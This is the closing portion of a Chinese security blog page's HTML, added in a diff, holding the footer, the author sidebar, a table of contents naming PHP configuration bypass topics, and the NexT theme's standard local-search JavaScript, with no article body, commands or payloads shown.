+                Meterpreter命令 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/mao.jpeg"
+                alt="alin" />
+            
+              <p class="site-author-name" itemprop="name">alin</p>
+              <p class="site-description motion-element" itemprop="description">走出菜鸟阵营</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">1.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extension-dir"><span class="nav-number">2.</span> <span class="nav-text">extension_dir</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-x-real-ip"><span class="nav-number">3.</span> <span class="nav-text">http_x_real_ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web根目录"><span class="nav-number">4.</span> <span class="nav-text">Web根目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#临时文件"><span class="nav-number">5.</span> <span class="nav-text">临时文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-include"><span class="nav-number">6.</span> <span class="nav-text">allow_url_include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#asp-tags"><span class="nav-number">7.</span> <span class="nav-text">asp_tags</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable-functions"><span class="nav-number">8.</span> <span class="nav-text">disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式"><span class="nav-number">8.1.</span> <span class="nav-text">绕过方式:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#magic-quotes-gpc"><span class="nav-number">9.</span> <span class="nav-text">magic_quotes_gpc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#open-basedir"><span class="nav-number">10.</span> <span class="nav-text">open_basedir</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式："><span class="nav-number">10.1.</span> <span class="nav-text">绕过方式：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩展"><span class="nav-number"></span> <span class="nav-text">扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#imagick"><span class="nav-number">1.</span> <span class="nav-text">imagick</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libxml"><span class="nav-number">2.</span> <span class="nav-text">libxml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#memcache"><span class="nav-number">3.</span> <span class="nav-text">memcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis"><span class="nav-number">4.</span> <span class="nav-text">redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session"><span class="nav-number">5.</span> <span class="nav-text">session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xdebug"><span class="nav-number">6.</span> <span class="nav-text">xdebug</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GOPHER"><span class="nav-number">7.</span> <span class="nav-text">GOPHER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastcgi"><span class="nav-number">8.</span> <span class="nav-text">fastcgi</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number"></span> <span class="nav-text">总结</span></a></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">alin</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
